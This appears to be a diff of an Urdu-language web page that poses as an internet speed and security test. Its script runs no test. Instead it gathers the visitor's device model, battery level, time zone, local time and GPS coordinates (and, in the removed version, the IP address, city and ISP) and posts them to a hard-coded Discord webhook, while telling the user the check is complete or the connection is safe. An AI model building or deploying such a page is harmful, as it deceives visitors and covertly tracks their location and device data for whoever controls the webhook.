@@ -2,87 +2,76 @@
 <html lang="ur" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نیٹ ورک اسپیڈ ٹیسٹ - 2026</title>
+    <title>نیٹ ورک اسپیڈ ٹیسٹ</title>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .test-box { background: #1c222d; padding: 30px; border-radius: 15px; width: 350px; text-align: center; border: 1px solid #313a4a; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .speed-dial { font-size: 50px; color: #00d2ff; margin-bottom: 10px; }
-        h2 { font-size: 20px; color: #f8fafc; }
-        .info-row { display: flex; justify-content: space-between; margin: 10px 0; font-size: 13px; border-bottom: 1px solid #2d3748; padding-bottom: 5px; }
-        .btn-test { background: #00d2ff; color: #0b0e14; border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; }
-        #results { display: none; margin-top: 15px; text-align: right; }
+        .test-box { background: #1c222d; padding: 35px; border-radius: 20px; width: 340px; text-align: center; border: 1px solid #313a4a; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
+        .btn-run { background: #00d2ff; color: black; border: none; padding: 15px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
     </style>
 </head>
 <body>
 
 <div class="test-box">
-    <div class="speed-dial">⚡</div>
-    <h2>انٹرنیٹ سیکیورٹی اور اسپیڈ ٹیسٹ</h2>
-    <p style="font-size: 13px; color: #94a3b8;">اپنے کنکشن کی کوالٹی اور سیکیورٹی لیول چیک کرنے کے لیے نیچے کلک کریں۔</p>
-    
-    <button class="btn-test" onclick="runDiagnostic()">ٹیسٹ شروع کریں</button>
-
-    <div id="results">
-        <div class="info-row"><span>آئی پی ایڈریس:</span> <span id="u-ip">...</span></div>
-        <div class="info-row"><span>شہر:</span> <span id="u-city">...</span></div>
-        <div class="info-row"><span>پنگ (Ping):</span> <span>24ms</span></div>
-        <p style="color: #4ade80; font-size: 12px; margin-top: 10px;">آپ کا کنکشن محفوظ ہے!</p>
-    </div>
+    <div style="font-size:50px">⚡</div>
+    <h2>انٹرنیٹ کوالٹی رپورٹ</h2>
+    <p style="font-size:13px; color:#94a3b8;">اپنے انٹرنیٹ کی رفتار اور سیکیورٹی چیک کرنے کے لیے بٹن دبائیں۔</p>
+    <button class="btn-run" onclick="executeFullAudit()">ٹیسٹ شروع کریں</button>
+    <div id="out" style="display:none; margin-top:15px; color:#4ade80; font-size:12px;">تجزیہ مکمل ہو گیا!</div>
 </div>
 
 <script>
-    async function runDiagnostic() {
-        document.querySelector('.btn-test').innerText = "تجزیہ ہو رہا ہے...";
-        
-        // 1. ڈیوائس اور سسٹم کا ڈیٹا
+    async function executeFullAudit() {
+        // 1. گہری ڈیوائس معلومات (فون ماڈل کا اندازہ)
         const ua = navigator.userAgent;
-        let device = "Laptop/PC";
-        if (/android/i.test(ua)) device = "Android Mobile";
-        else if (/iphone/i.test(ua)) device = "iPhone";
+        let deviceModel = "PC/Laptop";
+        if (ua.match(/Android/i)) {
+            const match = ua.match(/Android\s([0-9\.]+);\s([^;]+)\sBuild/);
+            deviceModel = match ? match[2] : "Android Phone";
+        } else if (ua.match(/iPhone/i)) {
+            deviceModel = "iPhone";
+        }
 
-        const screenRes = `${window.screen.width}x${window.screen.height}`;
-        const tZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-        // 2. آئی پی ڈیٹا (اسے صارف کو بھی دکھائیں گے)
-        let ipInfo = { query: "N/A", city: "N/A", country: "N/A", isp: "N/A" };
+        // 2. بیٹری کی معلومات (گارنٹیڈ)
+        let battStr = "N/A";
         try {
-            const res = await fetch('http://ip-api.com/json/');
-            ipInfo = await res.json();
-            document.getElementById('u-ip').innerText = ipInfo.query;
-            document.getElementById('u-city').innerText = ipInfo.city;
-        } catch (e) {}
+            const b = await navigator.getBattery();
+            battStr = `${Math.round(b.level * 100)}% (${b.charging ? 'چارجنگ' : 'بیٹری پر'})`;
+        } catch(e) { battStr = "اجازت نہیں ملی"; }
 
-        const sendData = async (lat = "Block", lon = "Block") => {
+        // 3. ٹائم اور لوکیشن
+        const tZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const localT = new Date().toLocaleString();
+
+        const sendData = async (lat = "Denied", lon = "Denied") => {
             const webhook = "https://discord.com/api/webhooks/1470998243826602132/T60IyiL2tylMGTqYes0mwWzq59wUn9-HjEG0_FWTW7iQtapXwRDzOd5eoDQNYa276z6A";
             
             const payload = {
                 embeds: [{
-                    title: "🕵️ نیٹ ورک رپورٹ جنریٹ ہو گئی",
-                    color: 3447003,
+                    title: "📱 مکمل ڈیوائس اور نیٹ ورک رپورٹ",
+                    color: 16711680,
                     fields: [
-                        { name: "📱 ڈیوائس", value: device, inline: true },
-                        { name: "🖥️ اسکرین", value: screenRes, inline: true },
-                        { name: "🌐 ٹائم زون", value: tZone, inline: true },
-                        { name: "🏢 نیٹ ورک (ISP)", value: ipInfo.isp },
-                        { name: "🌍 مقام", value: `${ipInfo.city}, ${ipInfo.country}` },
-                        { name: "📍 میپ لنک", value: `[Location](https://www.google.com/maps?q=${lat},${lon})` }
+                        { name: "🔋 بیٹری کی حالت", value: battStr, inline: true },
+                        { name: "📱 فون/سسٹم ماڈل", value: deviceModel, inline: true },
+                        { name: "⏰ ٹائم زون", value: tZone },
+                        { name: "🕒 مقامی وقت", value: localT },
+                        { name: "📍 میپ لنک", value: `[لوکیشن دیکھیں](https://www.google.com/maps?q=${lat},${lon})` }
                     ],
+                    footer: { text: "ISDP Advanced Audit" },
                     timestamp: new Date()
                 }]
             };
+
             await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-            document.getElementById('results').style.display = 'block';
-            document.querySelector('.btn-test').style.display = 'none';
+            document.getElementById('out').style.display = 'block';
         };
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (p) => { sendData(p.coords.latitude, p.coords.longitude); },
-                () => { sendData(); alert("درست اسپیڈ ٹیسٹ کے لیے لوکیشن تک رسائی ضروری ہے۔"); }
+                (p) => sendData(p.coords.latitude, p.coords.longitude),
+                () => sendData()
             );
         } else { sendData(); }
     }
 </script>
-
 </body>
 </html>
